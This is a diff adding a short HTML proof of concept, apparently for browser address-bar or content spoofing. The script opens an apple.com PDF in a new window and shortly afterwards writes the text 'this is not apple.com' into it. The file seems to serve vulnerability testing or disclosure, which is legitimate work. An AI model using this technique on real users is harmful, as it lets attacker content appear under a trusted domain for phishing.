@@ -1,0 +1,15 @@
+<a href="#" onclick="startSpoof()">Click Here</a>
+
+<script>
+function startSpoof() {
+    let win = window.open('https://www.apple.com/jp/support/cip/pdfs/battery_pmg4mdd.j.pdf', 'x');
+    
+    setTimeout(() => {
+        try {
+            win.document.write('this is not apple.com');
+        } catch(e) {
+            console.log(e);
+        }
+    }, 50);
+}
+</script>
